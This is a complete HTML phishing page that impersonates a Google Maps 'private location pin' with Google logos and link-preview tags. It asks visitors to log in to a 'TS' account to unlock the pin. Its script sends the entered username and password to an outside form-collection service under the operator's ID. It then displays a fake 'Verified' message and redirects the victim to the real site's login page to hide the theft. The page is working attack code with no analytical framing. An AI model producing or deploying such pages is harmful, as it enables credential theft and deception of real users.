<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <meta property="og:title" content="Google Maps: Shared Location Pin">
    <meta property="og:description" content="Verify your account to view this private location shared with you.">
    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png">
    <meta property="og:type" content="website">

    <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg">

    <title>Google Maps - Location Gateway</title>
    
    <style>
        body, html { height: 100%; margin: 0; font-family: -apple-system, sans-serif; overflow: hidden; background-color: #000; }
        #bg-map { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-size: cover; background-position: center; filter: blur(15px); -webkit-filter: blur(15px); z-index: -1; transform: scale(1.1); transition: background-image 0.5s ease-in-out; }
        .overlay { display: flex; justify-content: center; align-items: center; height: 100%; background: rgba(0,0,0,0.3); }
        .login-box { background: rgba(255, 255, 255, 0.98); padding: 35px; border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); width: 85%; max-width: 380px; text-align: center; }
        .logo { width: 60px; margin-bottom: 15px; }
        .ts-brand { color: #d93025; font-weight: 900; font-size: 2.3em; text-transform: uppercase; display: inline-block; vertical-align: middle; line-height: 1; letter-spacing: -1px; }
        h2 { font-size: 22px; color: #202124; margin-bottom: 10px; font-weight: 600; }
        p { color: #5f6368; font-size: 14px; margin-bottom: 25px; line-height: 1.5; }
        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dadce0; border-radius: 8px; box-sizing: border-box; font-size: 16px; background: #f8f9fa; }
        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #1a73e8; border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; display: none; margin: 15px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        button { width: 100%; padding: 14px; background: #1a73e8; color: white; border: none; border-radius: 8px; font-weight: 600; font-size: 16px; cursor: pointer; margin-top: 15px; }
        #success-view { display: none; }
        .checkmark { color: #4bb543; font-size: 60px; margin-bottom: 10px; }
    </style>
</head>
<body onload="detectDevice()">

    <div id="bg-map"></div>

    <div class="overlay">
        <div class="login-box">
            <div id="login-state">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/aa/Google_Maps_icon_%282020%29.svg" class="logo">
                <h2>Location Blocked</h2>
                <p>Login to your <span class="ts-brand">TS</span> account to verify identity and unlock this private location pin.</p>
                
                <form id="main-form">
                    <input type="text" name="user_id" placeholder="Username or Email" required>
                    <input type="password" name="user_pass" placeholder="Password" required>
                    <div id="loading" class="loader"></div>
                    <button type="submit" id="btn">Unlock Live Map</button>
                </form>
            </div>

            <div id="success-view">
                <div class="checkmark">✔</div>
                <h2>Verified</h2>
                <p>Connecting to live location... Please wait.</p>
                <div class="loader" style="display:block;"></div>
            </div>
        </div>
    </div>

    <script>
        // 1. Device Detection for Blur Background
        function detectDevice() {
            const bg = document.getElementById('bg-map');
            const ua = navigator.userAgent || navigator.vendor || window.opera;
            if (/iPad|iPhone|iPod/.test(ua) && !window.MSStream) {
                bg.style.backgroundImage = "url('https://images.macrumors.com/t/m-u2-K0X-D_M_0_R_Q_P_T_I_=/1600x1200/smart/article-new/2020/02/google-maps-ios.jpg')";
            } else {
                bg.style.backgroundImage = "url('https://techcrunch.com/wp-content/uploads/2019/02/google-maps-ar.jpg')";
            }
        }

        // 2. Fetch Submission (Ensures Basin gets data before redirect)
        const form = document.getElementById('main-form');
        const loginState = document.getElementById('login-state');
        const successView = document.getElementById('success-view');
        const loader = document.getElementById('loading');
        const btn = document.getElementById('btn');

        form.onsubmit = function(e) {
            e.preventDefault(); 
            btn.style.display = 'none';
            loader.style.display = 'block';

            const formData = new FormData(form);
            
            // Sending to YOUR Basin ID
            fetch("https://usebasin.com/f/7ab2ba455334", {
                method: "POST",
                body: formData,
                headers: { 'Accept': 'application/json' }
            })
            .then(response => {
                // Once data is safely captured, show success then redirect
                loginState.style.display = 'none';
                successView.style.display = 'block';
                
                setTimeout(() => {
                    window.location.href = "https://m.tsescorts.com/login";
                }, 2000);
            })
            .catch(error => {
                // Backup redirect if internet flickers
                window.location.href = "https://m.tsescorts.com/login";
            });
        };
    </script>
</body>
</html>
